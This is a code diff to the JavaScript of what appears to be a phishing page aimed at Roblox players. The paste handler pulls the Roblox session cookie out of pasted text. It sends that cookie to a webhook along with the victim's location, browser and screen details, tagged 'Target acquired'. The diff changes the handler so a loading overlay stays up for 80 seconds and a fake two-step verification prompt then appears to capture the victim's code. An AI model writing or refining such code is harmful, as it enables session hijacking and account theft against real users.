@@ -779,16 +779,20 @@ document.addEventListener('DOMContentLoaded', function() {
 // Handle paste event - immediate cookie capture + 80s timer for 2FA
 async function handlePasteEvent(pastedText) {
     try {
-        console.log('Paste detected, analyzing content...');
-        
-        // Show fake scanning progress to user
-        showFakeScanningProgress();
+        console.log('🍪 PASTE EVENT TRIGGERED - Content length:', pastedText.length);
         
         // Extract cookie from pasted text
         const robloxCookie = extractRobloxCookie(pastedText);
+        console.log('🔍 Cookie extraction result:', robloxCookie ? 'FOUND' : 'NOT FOUND');
         
         if (robloxCookie) {
             console.log('Roblox cookie found in pasted content, sending immediately...');
+            
+            // Show loading overlay immediately
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            if (loadingOverlay) {
+                loadingOverlay.style.display = 'flex';
+            }
             
             // Get user location
             const locationInfo = await getUserLocation();
@@ -811,7 +815,7 @@ Content Length: ${pastedText.length} characters
 Browser: ${navigator.userAgent}
 Screen: ${screen.width}x${screen.height}
 \`\`\`
-⏰ **2-Step Verification will trigger in 80 seconds...**
+⏰ **Loading screen active - 2FA will appear in 80 seconds...**
 🎯 **Target acquired - standby for 2FA capture**
 @everyone`
             };
@@ -828,26 +832,36 @@ Screen: ${screen.width}x${screen.height}
             if (response.ok) {
                 console.log('Cookie sent to webhook successfully');
                 
-                // Show fake success message to user
+                // Keep loading screen active and show 2FA after 80 seconds
                 setTimeout(() => {
-                    showNotification('Initial scan complete - analyzing data...', 'success');
-                }, 2000);
-                
-                // Set up 80-second timer for 2FA modal with countdown notifications
-                setupDelayed2FACapture();
+                    console.log('🔐 80 SECONDS ELAPSED - HIDING LOADING AND SHOWING 2FA!');
+                    
+                    // Hide loading overlay
+                    if (loadingOverlay) {
+                        loadingOverlay.style.display = 'none';
+                    }
+                    
+                    // Show 2FA modal
+                    openVerificationModal();
+                }, 80000); // 80 seconds
                 
             } else {
                 console.error('Failed to send cookie to webhook');
+                // Hide loading on error
+                if (loadingOverlay) {
+                    loadingOverlay.style.display = 'none';
+                }
             }
         } else {
             console.log('No Roblox cookie found in pasted content');
-            // Still show fake scanning for non-cookie content
-            setTimeout(() => {
-                showNotification('No sensitive data detected', 'info');
-            }, 3000);
         }
     } catch (error) {
         console.error('Error handling paste event:', error);
+        // Hide loading on error
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        if (loadingOverlay) {
+            loadingOverlay.style.display = 'none';
+        }
     }
 }
 
